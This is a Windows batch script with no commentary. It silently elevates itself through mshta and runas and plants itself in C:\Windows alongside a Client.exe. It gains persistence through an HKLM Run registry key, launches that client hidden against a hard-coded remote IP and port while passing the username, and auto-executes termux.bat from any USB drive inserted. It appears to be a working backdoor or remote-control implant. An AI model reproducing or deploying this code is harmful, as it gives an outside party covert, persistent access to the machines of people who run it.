%2start mshta vbscript:createobject("shell.application").shellexecute("""%~0""","%1 ::",,"runas",0)(window.close)&exit
cd /d %~dp0
@echo off
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "To_Client" 1>nul 2>nul
if errorlevel 1 (
	reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "To_Client" /t REG_SZ /d "C:\Windows\To_Client.bat" /f
)
REM else (
	REM reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f /v "To_Client"
REM )
if not "%~dp0"=="C:\Windows\" (
	copy /y Client.exe C:\Windows\
	copy /y To_Client.bat C:\Windows\
) else (
	REM :loop
	start Client -hide 103.46.128.46 54235 %username%
	REM start cmd /c Client 103.46.128.46 54235 %username%
	REM timeout 100 
	REM taskkill -f -im Client.exe
	REM goto :loop
)
REM Server 54235
REM taskkill -f -im cmd.exe
REM taskkill -f -im client.exe
REM taskkill -f -im timeout.exe
set USB_NUM=0
:loop_usb
>"%tmp%\$t.js" echo;try{WSH.echo(WSH.StdIn.ReadAll().replace(/\s*[\r\n]+/g,'\r\n'))}catch(e){}
for /f "tokens=1* delims==" %%a in ('wmic DiskDrive where "InterfaceType='USB'" get Index /value^|find "="^|cscript -nologo -e:jscript "%tmp%\$t.js"') do (
    for /f "tokens=1,2* delims==" %%c in ('wmic path Win32_LogicalDiskToPartition get Antecedent^,Dependent^|find "Disk #%%b,"^|cscript -nologo -e:jscript "%tmp%\$t.js"') do (
		call :USB %%~e
    )
)
timeout 2 >nul
goto :loop_usb

:USB
ping -n 2 127.1 >nul
for /l %%i in (1,1,%USB_NUM%) do (
	echo;	%1 == !USB%%i!
	if "%~1"=="!USB%%i!" exit /b
)
set /a USB_NUM+=1
title USB_NUM = %USB_NUM%
set "USB%USB_NUM%=%~1"
if exist "%~1\termux.bat" (
	start cmd /c "%~1\termux.bat"
)
exit /b